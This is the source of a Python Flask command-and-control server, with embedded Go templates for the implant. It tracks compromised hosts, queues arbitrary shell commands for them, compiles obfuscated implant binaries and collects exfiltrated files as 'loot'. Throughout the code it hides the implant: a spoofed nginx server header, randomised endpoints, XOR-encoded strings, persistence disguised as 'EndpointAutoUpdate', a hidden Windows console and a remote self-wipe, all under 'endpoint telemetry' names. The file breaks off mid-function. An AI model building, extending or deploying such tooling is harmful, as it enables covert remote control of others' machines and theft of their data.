from flask import Flask, request, jsonify, render_template, send_file, Response
from werkzeug.utils import secure_filename
from database import get_db_connection
from crypto import generate_key, encrypt_payload, decrypt_payload
from datetime import datetime, timezone
import json
import subprocess
import shutil
import tempfile
import os
import re
import zipfile

app = Flask(__name__)

# Replace the default Werkzeug/Python Server header on every response.
# Without this, the header would immediately fingerprint the C2 server
# as a Flask application to anyone inspecting the traffic.
@app.after_request
def mask_server_header(response):
    response.headers["Server"] = "nginx/1.24.0"
    return response

# Directory where compiled agent binaries are stored
BUILDS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "builds")
os.makedirs(BUILDS_DIR, exist_ok=True)

# Directory for exfiltrated files (loot)
LOOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
os.makedirs(LOOT_DIR, exist_ok=True)

# Directory for staged files (to push to agents)
STAGED_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "staged")
os.makedirs(STAGED_DIR, exist_ok=True)

# Path to the agent source code (relative to server/)
AGENT_SRC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "agent")


# ─────────────────────────────────────────────
#  Agent Path Initialisation
# ─────────────────────────────────────────────

def _init_agent_paths():
    """
    Load per-server random agent-facing URL paths from the database.
    If they don't exist yet (first startup), generate them and persist them.
    Returns a dict with keys: checkin, result, upload, files.
    """
    import secrets

    keys = ["path_checkin", "path_result", "path_upload", "path_files"]

    conn = get_db_connection()
    rows = conn.execute(
        "SELECT key, value FROM server_config WHERE key IN (?, ?, ?, ?)", keys
    ).fetchall()
    stored = {r["key"]: r["value"] for r in rows}

    # Generate any missing paths (first run, or partial DB state)
    for k in keys:
        if k not in stored:
            stored[k] = "/" + secrets.token_hex(4)
            conn.execute(
                "INSERT INTO server_config (key, value) VALUES (?, ?)",
                (k, stored[k]),
            )

    conn.commit()
    conn.close()
    return stored


_agent_paths = _init_agent_paths()

# Module-level path variables used by route registration and the build pipeline
AGENT_PATH_CHECKIN = _agent_paths["path_checkin"]
AGENT_PATH_RESULT  = _agent_paths["path_result"]
AGENT_PATH_UPLOAD  = _agent_paths["path_upload"]
AGENT_PATH_FILES   = _agent_paths["path_files"]


# ─────────────────────────────────────────────
#  Dashboard Route
# ─────────────────────────────────────────────

@app.route("/")
def dashboard():
    """Render the C2 operator dashboard."""
    return render_template("index.html")


# ─────────────────────────────────────────────
#  Agent Check-In API
# ─────────────────────────────────────────────

def SyncDeviceState():
    """
    Agent check-in endpoint.
    Expects: { "kid": "<8-char key fingerprint>", "data": "<base64 AES-256-GCM encrypted JSON>" }
    Inner plaintext:  { "agent_id": "...", "hostname": "...", "os": "..." }
    Returns encrypted: { "kid": "...", "data": "<encrypted JSON>" }
    Inner response:   { "status": "ok", "tasks": [ { "id": ..., "command": "..." }, ... ] }
    """
    envelope = request.get_json()

    # Validate envelope
    if not envelope or "kid" not in envelope or "data" not in envelope:
        return jsonify({"error": "Invalid envelope"}), 400

    kid = envelope["kid"]
    key_hex = _get_key_for_kid(kid)
    if not key_hex:
        return jsonify({"error": "Unknown key_id"}), 403

    # Decrypt the inner payload
    try:
        raw  = decrypt_payload(key_hex, envelope["data"])
        data = json.loads(raw)
    except Exception:
        return jsonify({"error": "Decryption failed"}), 403

    if "agent_id" not in data:
        return jsonify({"error": "Missing agent_id"}), 400

    agent_id   = data["agent_id"]
    hostname   = data.get("hostname", "unknown")
    agent_os   = data.get("os", "unknown")
    ip         = request.remote_addr

    conn = get_db_connection()

    existing = conn.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()

    if existing:
        conn.execute(
            "UPDATE agents SET hostname = ?, ip = ?, os = ?, last_seen = ? WHERE id = ?",
            (hostname, ip, agent_os, datetime.now(timezone.utc).isoformat(), agent_id),
        )
    else:
        conn.execute(
            "INSERT INTO agents (id, hostname, ip, os, last_seen) VALUES (?, ?, ?, ?, ?)",
            (agent_id, hostname, ip, agent_os, datetime.now(timezone.utc).isoformat()),
        )

    conn.commit()

    tasks = conn.execute(
        "SELECT id, command FROM tasks WHERE agent_id = ? AND status = 'pending'",
        (agent_id,),
    ).fetchall()

    for task in tasks:
        conn.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task["id"],))

    conn.commit()
    conn.close()

    # Encrypt the response before sending it back
    response_body = {
        "status": "ok",
        "tasks": [{"id": t["id"], "command": t["command"]} for t in tasks],
    }
    enc = encrypt_payload(key_hex, json.dumps(response_body).encode())
    return jsonify({"kid": kid, "data": enc})


# ─────────────────────────────────────────────
#  Crypto Helpers
# ─────────────────────────────────────────────

def _get_key_for_kid(kid: str) -> str | None:
    """
    Look up the AES-256 encryption key for a given key_id fingerprint.
    Returns the 64-char hex key string, or None if the kid is not found.
    """
    conn = get_db_connection()
    row = conn.execute(
        "SELECT encryption_key FROM builds WHERE key_id = ?", (kid,)
    ).fetchone()
    conn.close()
    return row["encryption_key"] if row else None


# ─────────────────────────────────────────────
#  DiagnosticTask Management API
# ─────────────────────────────────────────────

@app.route("/api/task", methods=["POST"])
def submit_task():
    """
    Submit a new task for an agent.
    Receives: { "agent_id": "...", "command": "..." }
    Returns:  { "task_id": ... }
    """
    data = request.get_json()

    if not data or "agent_id" not in data or "command" not in data:
        return jsonify({"error": "Missing agent_id or command"}), 400

    conn = get_db_connection()
    cursor = conn.execute(
        "INSERT INTO tasks (agent_id, command) VALUES (?, ?)",
        (data["agent_id"], data["command"]),
    )
    task_id = cursor.lastrowid
    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "task_id": task_id})


@app.route("/api/tasks/<agent_id>", methods=["GET"])
def get_tasks(agent_id):
    """Get all tasks for a specific agent."""
    conn = get_db_connection()
    tasks = conn.execute(
        "SELECT id, command, status, created_at FROM tasks WHERE agent_id = ? ORDER BY created_at DESC",
        (agent_id,),
    ).fetchall()
    conn.close()

    return jsonify({
        "tasks": [
            {
                "id": t["id"],
                "command": t["command"],
                "status": t["status"],
                "created_at": t["created_at"],
            }
            for t in tasks
        ]
    })


# ─────────────────────────────────────────────
#  Result API
# ─────────────────────────────────────────────

def submit_result():
    """
    Agent submits task result.
    Expects: { "kid": "<key fingerprint>", "data": "<encrypted JSON>" }
    Inner plaintext: { "task_id": ..., "output": "..." }
    """
    envelope = request.get_json()

    # Validate and decrypt
    if not envelope or "kid" not in envelope or "data" not in envelope:
        return jsonify({"error": "Invalid envelope"}), 400

    kid = envelope["kid"]
    key_hex = _get_key_for_kid(kid)
    if not key_hex:
        return jsonify({"error": "Unknown key_id"}), 403

    try:
        raw  = decrypt_payload(key_hex, envelope["data"])
        data = json.loads(raw)
    except Exception:
        return jsonify({"error": "Decryption failed"}), 403

    if "task_id" not in data:
        return jsonify({"error": "Missing task_id"}), 400

    # Store result and handle self-destruct cleanup
    conn = get_db_connection()
    conn.execute(
        "INSERT INTO results (task_id, output) VALUES (?, ?)",
        (data["task_id"], data.get("output", "")),
    )
    conn.execute("UPDATE tasks SET status = 'complete' WHERE id = ?", (data["task_id"],))
    conn.commit()

    task = conn.execute(
        "SELECT agent_id, command FROM tasks WHERE id = ?", (data["task_id"],)
    ).fetchone()

    if task and task["command"] == "__flush_cache__":
        agent_id = task["agent_id"]
        conn.execute("""
            DELETE FROM results WHERE task_id IN (
                SELECT id FROM tasks WHERE agent_id = ?
            )
        """, (agent_id,))
        conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
        conn.commit()

    conn.close()

    # Encrypt the response
    enc = encrypt_payload(key_hex, json.dumps({"status": "ok"}).encode())
    return jsonify({"kid": kid, "data": enc})


@app.route("/api/results/<int:task_id>", methods=["GET"])
def get_results(task_id):
    """Get results for a specific task."""
    conn = get_db_connection()
    results = conn.execute(
        "SELECT id, output, received_at FROM results WHERE task_id = ?",
        (task_id,),
    ).fetchall()
    conn.close()

    return jsonify({
        "results": [
            {
                "id": r["id"],
                "output": r["output"],
                "received_at": r["received_at"],
            }
            for r in results
        ]
    })


# ─────────────────────────────────────────────
#  Agents API (for AJAX dashboard refresh)
# ─────────────────────────────────────────────

@app.route("/api/agents", methods=["GET"])
def get_agents():
    """Return all agents as JSON."""
    conn = get_db_connection()
    agents = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    conn.close()

    return jsonify({
        "agents": [
            {
                "id": a["id"],
                "hostname": a["hostname"],
                "ip": a["ip"],
                "os": a["os"],
                "last_seen": a["last_seen"],
            }
            for a in agents
        ]
    })


@app.route("/api/agents/<agent_id>", methods=["DELETE"])
def delete_agent(agent_id):
    """
    Queue a self-destruct task for the agent.
    The agent will wipe itself from the host on its next check-in.
    The agent record is kept in the DB so it can still pick up the task.
    """
    conn = get_db_connection()

    # Check if agent exists
    agent = conn.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()
    if not agent:
        conn.close()
        return jsonify({"error": "Agent not found"}), 404

    # Check if a self-destruct task is already pending
    existing = conn.execute(
        "SELECT id FROM tasks WHERE agent_id = ? AND command = '__flush_cache__' AND status = 'pending'",
        (agent_id,),
    ).fetchone()

    if not existing:
        # Queue the self-destruct command
        conn.execute(
            "INSERT INTO tasks (agent_id, command) VALUES (?, '__flush_cache__')",
            (agent_id,),
        )
        conn.commit()

    conn.close()

    return jsonify({"status": "ok", "message": "Self-destruct queued. Agent will wipe on next check-in."})


@app.route("/api/agents/<agent_id>/force", methods=["DELETE"])
def force_delete_agent(agent_id):
    """Force-remove an agent record and all its data from the database (no remote wipe)."""
    conn = get_db_connection()

    conn.execute("""
        DELETE FROM results WHERE task_id IN (
            SELECT id FROM tasks WHERE agent_id = ?
        )
    """, (agent_id,))
    conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
    conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))

    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# ─────────────────────────────────────────────
#  Stats API
# ─────────────────────────────────────────────

@app.route("/api/stats", methods=["GET"])
def get_stats():
    """Return aggregate dashboard statistics."""
    conn = get_db_connection()

    agent_count = conn.execute("SELECT COUNT(*) as c FROM agents").fetchone()["c"]
    pending_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'pending'").fetchone()["c"]
    sent_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'sent'").fetchone()["c"]
    complete_tasks = conn.execute("SELECT COUNT(*) as c FROM tasks WHERE status = 'complete'").fetchone()["c"]
    total_builds = conn.execute("SELECT COUNT(*) as c FROM builds").fetchone()["c"]

    conn.close()

    return jsonify({
        "agents": agent_count,
        "pending": pending_tasks,
        "sent": sent_tasks,
        "completed": complete_tasks,
        "builds": total_builds,
    })


# ─────────────────────────────────────────────
#  Build / Deploy API
# ─────────────────────────────────────────────

def _sanitize_interval(interval_str):
    """Validate and sanitize a Go time.Duration string like '10s', '1m', '30s'."""
    pattern = r'^(\d+)(s|m|h)$'
    match = re.match(pattern, interval_str.strip())
    if not match:
        return None
    return interval_str.strip()


def _xor_encrypt(key: bytes, plaintext: str) -> str:
    """XOR-encrypt a plaintext string with a multi-byte key, return hex."""
    pt = plaintext.encode()
    ct = bytes(b ^ key[i % len(key)] for i, b in enumerate(pt))
    return ct.hex()


def _generate_config_go(server_url, jitter_min, jitter_max, persistence,
                        profile_id=1, locale="en-US,en;q=0.9",
                        key_hex="", key_id="",
                        path_checkin="/api/checkin", path_result="/api/result",
                        path_upload="/api/upload", path_files="/api/files/"):
    """Generate a config.go file with the given settings."""

    # Generate a random 16-byte XOR key for string obfuscation
    xor_key = os.urandom(16)
    xor_key_hex = xor_key.hex()

    # XOR-encrypt sensitive strings at build time
    enc_server_url   = _xor_encrypt(xor_key, server_url)
    enc_checkin_path = _xor_encrypt(xor_key, path_checkin)
    enc_result_path  = _xor_encrypt(xor_key, path_result)
    enc_upload_path  = _xor_encrypt(xor_key, path_upload)
    enc_files_path   = _xor_encrypt(xor_key, path_files)
    enc_flush_cmd    = _xor_encrypt(xor_key, "__flush_cache__")
    enc_svc_label    = _xor_encrypt(xor_key, "EndpointAutoUpdate")

    return f'''package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"time"

	"endpoint-telemetry/funcs"
)

var (
	// XOR key for runtime string decoding (generated per build)
	obfKey = parseDiagnosticKey("{xor_key_hex}")

	// Sensitive strings decoded at init time
	TelemetryEndpoint string
	PathCheckin       string
	PathResult        string
	PathUpload        string
	PathFiles         string
	FlushCommand      string
	ServiceTag        string

	SyncDelayMin  = {jitter_min} * time.Second
	SyncDelayMax  = {jitter_max} * time.Second
	ProfileID     = {profile_id}
	Locale        = "{locale}"
	EndpointID    string
	EnablePersist = {str(persistence).lower()}

	// Per-build AES-256-GCM key
	KeyID         = "{key_id}"
	EncryptionKey = parseDiagnosticKey("{key_hex}")
)

// parseDiagnosticKey decodes a hex string into []byte, panicking on failure.
// If this panics at startup the binary was built with a malformed key.
func parseDiagnosticKey(s string) []byte {{
	b, err := hex.DecodeString(s)
	if err != nil {{
		panic("config: invalid key hex: " + err.Error())
	}}
	return b
}}

func assignEndpointID() string {{
	b := make([]byte, 16)
	rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40 // version 4
	b[8] = (b[8] & 0x3f) | 0x80 // variant 10
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}}

func InitializeTelemetry() {{
	// Decode obfuscated strings into memory
	TelemetryEndpoint = funcs.ResolveConfig(obfKey, "{enc_server_url}")
	PathCheckin       = funcs.ResolveConfig(obfKey, "{enc_checkin_path}")
	PathResult        = funcs.ResolveConfig(obfKey, "{enc_result_path}")
	PathUpload        = funcs.ResolveConfig(obfKey, "{enc_upload_path}")
	PathFiles         = funcs.ResolveConfig(obfKey, "{enc_files_path}")
	FlushCommand      = funcs.ResolveConfig(obfKey, "{enc_flush_cmd}")
	ServiceTag        = funcs.ResolveConfig(obfKey, "{enc_svc_label}")
	funcs.ServiceLabel = ServiceTag

	EndpointID = assignEndpointID()

	profile, ok := funcs.Profiles[ProfileID]
	if !ok {{
		profile = funcs.Profiles[1] // fallback to Chrome/Windows
	}}

	// Set Accept-Language from the locale baked in at build time
	profile.Headers["Accept-Language"] = Locale

	// Replace the default HTTP client so every request the agent makes
	// goes through the browser profile transport automatically
	http.DefaultClient = &http.Client{{
		Transport: &funcs.UATransport{{
			Base:    http.DefaultTransport,
			Profile: profile,
		}},
	}}

	fmt.Println("=======================================")
	fmt.Println("   Endpoint Telemetry  Initialized     ")
	fmt.Println("=======================================")
	fmt.Printf("  Endpoint  : %s\\n", EndpointID)
	fmt.Printf("  Gateway   : %s\\n", TelemetryEndpoint)
	fmt.Printf("  Interval  : %s to %s\\n", SyncDelayMin, SyncDelayMax)
	fmt.Printf("  Profile   : %s\\n", profile.Name)
	fmt.Printf("  Locale    : %s\\n", Locale)
	fmt.Printf("  OS/Arch   : %s/%s\\n", runtime.GOOS, runtime.GOARCH)

	hostname, err := os.Hostname()
	if err == nil {{
		fmt.Printf("  Hostname  : %s\\n", hostname)
	}}

	fmt.Println("=======================================")
}}

'''


def _generate_main_go(persistence):
    """Generate main.go, optionally with persistence call."""
    persist_block = ""
    if persistence:
        persist_block = """
\t// Register auto-update service
\tif EnablePersist {{
\t\tif err := funcs.InstallAutoUpdater(); err != nil {{
\t\t\tfmt.Printf("[!] Auto-update registration failed: %v\\n", err)
\t\t}} else {{
\t\t\tfmt.Println("[+] Auto-update registered successfully")
\t\t}}
\t}}
"""

    return f'''package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"

	"endpoint-telemetry/funcs"
)

type DeviceTelemetryPayload struct {{
	EndpointID  string `json:"agent_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}}

type SyncResponse struct {{
	Status string          `json:"status"`
	Jobs   []DiagnosticJob `json:"tasks"`
}}

type DiagnosticJob struct {{
	ID      int    `json:"id"`
	Command string `json:"command"`
}}

type DiagnosticOutput struct {{
	JobID int    `json:"task_id"`
	Output string `json:"output"`
}}

func main() {{
	InitializeTelemetry()
{persist_block}
	hostname, _ := os.Hostname()
	agentOS := runtime.GOOS

	fmt.Printf("\\n[*] Starting check-in loop (jitter: %s - %s)…\\n\\n", SyncDelayMin, SyncDelayMax)

	for {{
		jobs, err := SyncDeviceState(hostname, agentOS)
		if err != nil {{
			fmt.Printf("[!] Check-in failed: %v\\n", err)
			funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
			continue
		}}

		fmt.Printf("[+] Checked in - %d pending job(s)\\n", len(jobs))

		for _, job := range jobs {{
			fmt.Printf("[>] Executing job #%d: %s\\n", job.ID, job.Command)

			if job.Command == FlushCommand {{
				fmt.Println("[!] Cache flush command received from server")
				_ = SubmitDiagnosticReport(job.ID, "Cache flush acknowledged. Cleaning up…")
				funcs.WipeLocalCacheAndExit()
			}}

			// cd is handled synchronously, it mutates CurrentDir which subsequent commands depend on
			if funcs.IsPathUpdate(job.Command) {{
				output, cdErr := funcs.ExecuteDiagnosticTask(job.Command)
				if cdErr != nil {{
					output = fmt.Sprintf("Error: %v", cdErr)
				}}
				fmt.Printf("[<] Job #%d result: %s\\n", job.ID, output)
				_ = SubmitDiagnosticReport(job.ID, output)
				continue
			}}

			if strings.HasPrefix(job.Command, "get ") {{
				go func(t DiagnosticJob) {{
					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, filePath)
					if err != nil {{
						output = fmt.Sprintf("Upload error: %v", err)
					}}
					fmt.Printf("[<] Job #%d result: %s\\n", t.ID, output)
					_ = SubmitDiagnosticReport(t.ID, output)
				}}(job)
				continue
			}}

			if strings.HasPrefix(job.Command, "download ") {{
				go func(t DiagnosticJob) {{
					args := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
					parts := strings.SplitN(args, " ", 2)
					if len(parts) != 2 {{
						_ = SubmitDiagnosticReport(t.ID, "Usage: download <file_id> <save_path>")
						return
					}}
					output, err := funcs.FetchUpdatePackage(TelemetryEndpoint+PathFiles, parts[0], strings.TrimSpace(parts[1]))
					if err != nil {{
						output = fmt.Sprintf("Download error: %v", err)
					}}
					fmt.Printf("[<] Job #%d result: %s\\n", t.ID, output)
					_ = SubmitDiagnosticReport(t.ID, output)
				}}(job)
				continue
			}}

			go func(t DiagnosticJob) {{
				output, execErr := funcs.ExecuteDiagnosticTask(t.Command)
				if execErr != nil && output == "" {{
					output = fmt.Sprintf("Error: %v", execErr)
				}}
				fmt.Printf("[<] Job #%d result (%d bytes)\\n", t.ID, len(output))
				err := SubmitDiagnosticReport(t.ID, output)
				if err != nil {{
					fmt.Printf("[!] Failed to send result for job #%d: %v\\n", t.ID, err)
				}}
			}}(job)
		}}

		funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
	}}
}}

func SyncDeviceState(hostname, agentOS string) ([]DiagnosticJob, error) {{
	payload := DeviceTelemetryPayload{{
		EndpointID:  EndpointID,
		Hostname: hostname,
		OS:       agentOS,
	}}

	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathCheckin, payload)
	if err != nil {{
		return nil, err
	}}

	// Unwrap the encrypted response envelope
	var envelope struct {{
		Data string `json:"data"`
	}}
	if err := json.Unmarshal(respBody, &envelope); err != nil {{
		return nil, fmt.Errorf("envelope unmarshal: %w", err)
	}}

	plain, err := funcs.UnsealTelemetry(EncryptionKey, envelope.Data)
	if err != nil {{
		return nil, fmt.Errorf("decrypt checkin response: %w", err)
	}}

	var result SyncResponse
	if err := json.Unmarshal(plain, &result); err != nil {{
		return nil, fmt.Errorf("unmarshal response: %w", err)
	}}
	return result.Jobs, nil
}}

func SubmitDiagnosticReport(jobID int, output string) error {{
	payload := DiagnosticOutput{{
		JobID: jobID,
		Output: output,
	}}
	_, err := transmitSecureTelemetry(TelemetryEndpoint+PathResult, payload)
	return err
}}

// transmitSecureTelemetry JSON-encodes payload, encrypts it with AES-256-GCM,
// wraps the ciphertext in a {{kid, data}} envelope, and POSTs it.
// Returns the raw response body so the caller can decrypt if needed.
func transmitSecureTelemetry(url string, payload any) ([]byte, error) {{
	inner, err := json.Marshal(payload)
	if err != nil {{
		return nil, fmt.Errorf("marshal: %w", err)
	}}

	enc, err := funcs.SealTelemetry(EncryptionKey, inner)
	if err != nil {{
		return nil, fmt.Errorf("encrypt: %w", err)
	}}

	envelope := map[string]string{{"kid": KeyID, "data": enc}}
	body, err := json.Marshal(envelope)
	if err != nil {{
		return nil, fmt.Errorf("envelope marshal: %w", err)
	}}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(body))
	if err != nil {{
		return nil, fmt.Errorf("post: %w", err)
	}}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}}

'''


@app.route("/api/build", methods=["POST"])
def build_agent():
    """
    Build an agent binary with custom configuration.
    Receives: { "target_os": "windows", "arch": "amd64", "server_url": "...",
                "interval": "10", "persistence": true }
    Returns:  { "status": "ok", "filename": "...", "build_id": ... }
    """
    data = request.get_json()

    if not data:
        return jsonify({"error": "Missing request body"}), 400

    target_os = data.get("target_os", "windows")
    arch = data.get("arch", "amd64")
    server_url = data.get("server_url", "http://localhost:5000")
    jitter_min_raw = data.get("jitter_min", "8")
    jitter_max_raw = data.get("jitter_max", "15")
    persistence = data.get("persistence", False)
    profile_id = data.get("profile_id", 1)
    locale = data.get("locale", "en-US,en;q=0.9")

    # Validate target OS
    valid_os = ["windows", "linux", "mac"]
    if target_os not in valid_os:
        return jsonify({"error": f"Invalid target_os. Must be one of: {valid_os}"}), 400

    # Validate architecture
    valid_arch = ["amd64", "arm64", "386"]
    if arch not in valid_arch:
        return jsonify({"error": f"Invalid arch. Must be one of: {valid_arch}"}), 400

    # Parse jitter_min
    try:
        jitter_min = int(jitter_min_raw)
        if jitter_min < 1 or jitter_min > 3600:
            return jsonify({"error": "jitter_min must be between 1 and 3600 seconds"}), 400
    except ValueError:
        return jsonify({"error": "jitter_min must be a number (seconds)"}), 400

    # Parse jitter_max
    try:
        jitter_max = int(jitter_max_raw)
        if jitter_max < 1 or jitter_max > 3600:
            return jsonify({"error": "jitter_max must be between 1 and 3600 seconds"}), 400
    except ValueError:
        return jsonify({"error": "jitter_max must be a number (seconds)"}), 400

    if jitter_min >= jitter_max:
        return jsonify({"error": "jitter_min must be less than jitter_max"}), 400

    # Validate server URL
    if not server_url.startswith("http://") and not server_url.startswith("https://"):
        return jsonify({"error": "Server URL must start with http:// or https://"}), 400

    # Validate profile_id
    try:
        profile_id = int(profile_id)
        if profile_id < 1 or profile_id > 5:
            return jsonify({"error": "profile_id must be between 1 and 5"}), 400
    except (ValueError, TypeError):
        return jsonify({"error": "profile_id must be a number (1-5)"}), 400

    # Sanitize locale (basic validation: allow alphanumerics, dashes, commas, semicolons, equals, periods)
    import re as _re
    if not _re.match(r'^[a-zA-Z0-9\-,;=. ]+$', locale):
        return jsonify({"error": "Invalid locale format"}), 400

    # Build filename
    ext = ".exe" if target_os == "windows" else ""
    filename = f"agent_{target_os}_{arch}{ext}"

    # Create temp directory for the build
    tmp_dir = tempfile.mkdtemp(prefix="c2_build_")

    try:
        # Copy agent source to temp directory
        agent_src = os.path.abspath(AGENT_SRC_DIR)
        tmp_agent = os.path.join(tmp_dir, "agent")
        shutil.copytree(agent_src, tmp_agent)

        # Generate key for this build
        key_hex, key_id = generate_key()

        # Generate custom config.go
        config_content = _generate_config_go(
            server_url, jitter_min, jitter_max, persistence, profile_id, locale,
            key_hex=key_hex, key_id=key_id,
            path_checkin=AGENT_PATH_CHECKIN,
            path_result=AGENT_PATH_RESULT,
            path_upload=AGENT_PATH_UPLOAD,
            path_files=AGENT_PATH_FILES + "/",
        )
        with open(os.path.join(tmp_agent, "config.go"), "w", encoding="utf-8") as f:
            f.write(config_content)

        # Generate main.go with optional persistence
        main_content = _generate_main_go(persistence)
        with open(os.path.join(tmp_agent, "main.go"), "w", encoding="utf-8") as f:
            f.write(main_content)

        # Build the binary
        output_path = os.path.join(tmp_dir, filename)
        env = os.environ.copy()
        env["GOOS"] = "darwin" if target_os == "mac" else target_os
        env["GOARCH"] = arch
        env["CGO_ENABLED"] = "0"

        # Base ldflags (strip debug symbols and DWARF info)
        ldflags = "-s -w"

        # If building for Windows, hide the console window entirely
        if target_os == "windows":
            ldflags += " -H=windowsgui"

        ldflags += " -buildid="

        result = subprocess.run(
            ["go", "build", "-trimpath", "-ldflags", ldflags, "-o", output_path, "."],
            cwd=tmp_agent,
            env=env,
            capture_output=True,
            text=True,
            timeout=120,
        )

        if result.returncode != 0:
            error_msg = result.stderr or result.stdout or "Unknown build error"
            return jsonify({"error": f"Build failed: {error_msg}"}), 500

        # Move binary to builds directory
        final_path = os.path.join(BUILDS_DIR, filename)

        # If file already exists, add a timestamp
        if os.path.exists(final_path):
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            name, extension = os.path.splitext(filename)
            filename = f"{name}_{timestamp}{extension}"
            final_path = os.path.join(BUILDS_DIR, filename)

        shutil.move(output_path, final_path)
        file_size = os.path.getsize(final_path)

        # Record in database
        conn = get_db_connection()
        cursor = conn.execute(
            "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size, key_id, encryption_key) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
            (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", 1 if persistence else 0, final_path, file_size, key_id, key_hex),
        )
        build_id = cursor.lastrowid
        conn.commit()
        conn.close()

        return jsonify({
            "status": "ok",
            "build_id": build_id,
            "filename": filename,
            "file_size": file_size,
        })

    except subprocess.TimeoutExpired:
        return jsonify({"error": "Build timed out (120s limit)"}), 500
    except Exception as e:
        return jsonify({"error": f"Build error: {str(e)}"}), 500
    finally:
        # Clean up temp directory
        shutil.rmtree(tmp_dir, ignore_errors=True)


@app.route("/api/builds", methods=["GET"])
def get_builds():
    """Return all builds as JSON."""
    conn = get_db_connection()
    builds = conn.execute("SELECT * FROM builds ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "builds": [
            {
                "id": b["id"],
                "filename": b["filename"],
                "target_os": b["target_os"],
                "arch": b["arch"],
                "server_url": b["server_url"],
                "callback_interval": b["callback_interval"],
                "persistence": bool(b["persistence"]),
                "file_size": b["file_size"],
                "created_at": b["created_at"],
            }
            for b in builds
        ]
    })


@app.route("/api/builds/download/<int:build_id>", methods=["GET"])
def download_build(build_id):
    """Download a built agent binary."""
    conn = get_db_connection()
    build = conn.execute("SELECT * FROM builds WHERE id = ?", (build_id,)).fetchone()
    conn.close()

    if not build:
        return jsonify({"error": "Build not found"}), 404

    file_path = build["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "Build file not found on disk"}), 404

    filename = build["filename"]
    with open(file_path, "rb") as f:
        binary_data = f.read()

    response = Response(binary_data, mimetype="application/octet-stream")
    response.headers["Content-Disposition"] = f'attachment; filename="{filename}"'
    response.headers["Content-Length"] = str(len(binary_data))
    return response


@app.route("/api/builds/<int:build_id>", methods=["DELETE"])
def delete_build(build_id):
    """Delete a build and its file."""
    conn = get_db_connection()
    build = conn.execute("SELECT * FROM builds WHERE id = ?", (build_id,)).fetchone()

    if not build:
        conn.close()
        return jsonify({"error": "Build not found"}), 404

    # Delete file from disk
    file_path = build["file_path"]
    if os.path.exists(file_path):
        os.remove(file_path)

    # Delete from database
    conn.execute("DELETE FROM builds WHERE id = ?", (build_id,))
    conn.commit()
    conn.close()

    return jsonify({"status": "ok"})


# ─────────────────────────────────────────────
#  Upload / Exfiltration API (Agent → Server)
# ─────────────────────────────────────────────

def receive_upload():
    """Receive an exfiltrated file from an agent."""
    if "file" not in request.files:
        return jsonify({"error": "No file provided"}), 400

    file = request.files["file"]
    agent_id = request.form.get("agent_id", "unknown")
    original_path = request.form.get("original_path", "")

    filename = secure_filename(file.filename) if file.filename else "unnamed"
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    save_name = f"{timestamp}_{filename}"
    save_path = os.path.join(LOOT_DIR, save_name)

    file.save(save_path)
    file_size = os.path.getsize(save_path)

    conn = get_db_connection()
    conn.execute(
        "INSERT INTO loot (agent_id, filename, original_path, file_path, file_size) VALUES (?, ?, ?, ?, ?)",
        (agent_id, filename, original_path, save_path, file_size),
    )
    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "filename": filename, "size": file_size})


@app.route("/api/loot", methods=["GET"])
def get_loot():
    """Return all exfiltrated files."""
    conn = get_db_connection()
    loot = conn.execute("SELECT * FROM loot ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "loot": [
            {
                "id": l["id"],
                "agent_id": l["agent_id"],
                "filename": l["filename"],
                "original_path": l["original_path"],
                "file_size": l["file_size"],
                "created_at": l["created_at"],
            }
            for l in loot
        ]
    })


@app.route("/api/loot/download/<int:loot_id>", methods=["GET"])
def download_loot(loot_id):
    """Download an exfiltrated file."""
    conn = get_db_connection()
    item = conn.execute("SELECT * FROM loot WHERE id = ?", (loot_id,)).fetchone()
    conn.close()

    if not item:
        return jsonify({"error": "Loot not found"}), 404

    file_path = item["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "File not found on disk"}), 404

    return send_file(file_path, as_attachment=True, download_name=item["filename"])


@app.route("/api/loot/<int:loot_id>", methods=["DELETE"])
def delete_loot(loot_id):
    """Delete an exfiltrated file."""
    conn = get_db_connection()
    item = conn.execute("SELECT * FROM loot WHERE id = ?", (loot_id,)).fetchone()

    if not item:
        conn.close()
        return jsonify({"error": "Loot not found"}), 404

